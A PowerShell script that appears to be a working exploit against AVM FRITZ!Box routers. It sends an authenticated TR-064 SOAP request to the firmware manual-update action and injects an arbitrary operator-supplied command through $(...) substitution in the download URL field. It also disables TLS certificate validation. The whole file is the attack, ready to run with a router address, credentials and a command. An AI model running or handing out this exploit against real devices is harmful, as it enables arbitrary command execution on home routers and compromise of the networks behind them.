Param([Parameter(Mandatory = $True, Position = 0, HelpMessage = 'the username to login to TR-064')][string]$Username,
      [Parameter(Mandatory = $True, Position = 1, HelpMessage = 'the password to login to TR-064')][string]$Password,
      [Parameter(Mandatory = $True, Position = 2, HelpMessage = 'the command to inject')][string]$Command,
      [Parameter(Mandatory = $False, Position = 3, HelpMessage = 'the external SSL port of the FRITZ!Box, defaults to 443')][string]$GUISSLPort = 49443,
      [Parameter(Mandatory = $False, Position = 4, HelpMessage = 'the IP address of the FRITZ!Box, defaults to 192.168.178.1')][string]$Address = "192.168.178.1")

$WebClient = New-Object System.Net.WebClient
$getinfo_query='<?xml version="1.0"?><s:Envelope xmlns:s="http:#schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http:#schemas.xmlsoap.org/soap/encoding/"><s:Body><u:X_AVM-DE_DoManualUpdate xmlns:u="urn:dslforum-org:service:UserInterface:1"><NewX_AVM-DE_DownloadURL>http://fritz.box/jason_boxinfo.xml$(' + $Command + ')</NewX_AVM-DE_DownloadURL><NewX_AVM-DE_AllowDowngrade>0</NewX_AVM-DE_AllowDowngrade></u:X_AVM-DE_DoManualUpdate></s:Body></s:Envelope>'
# the specified URL doesn't matter ... it's only used to start a "httpsdl" instance, which contains the injected command in the URL field

$WebClient.Encoding = [System.Text.Encoding]::UTF8
$WebClient.Headers.Set("Content-Type", 'text/xml; charset="utf-8"')
$WebClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$WebClient.Headers.Set("Content-Type", 'text/xml; charset="utf-8"')
$WebClient.Headers.Set("SOAPACTION", 'urn:dslforum-org:service:UserInterface:1#X_AVM-DE_DoManualUpdate')
$response = [xml]$WebClient.UploadString("https://" + $Address + ":" + $GUISSLPort + "/upnp/control/userif", $getinfo_query)

$response.Envelope.Body.InnerXml
